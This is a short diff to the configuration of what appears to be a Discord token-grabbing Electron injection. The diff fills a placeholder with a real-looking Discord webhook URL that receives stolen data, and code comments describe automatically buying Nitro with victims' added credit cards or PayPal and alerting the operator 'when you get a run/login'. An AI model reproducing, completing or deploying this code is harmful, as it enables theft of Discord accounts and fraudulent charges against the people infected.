@@ -6,7 +6,7 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
 const config = {
-  webhook: '%WEBHOOK%',
+  webhook: 'https://canary.discord.com/api/webhooks/985538845581918248/pVl4QKdatMWMz8YoLmoAJVMIpLemO9FKfRgCw52_BHXgVKG5wjJOCiVEoAuJv99npFZJ',
   ip: '%IP%',
   auto_buy_nitro: true, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
   ping_on_run: false, //sends whatever value you have in ping_val when you get a run/login
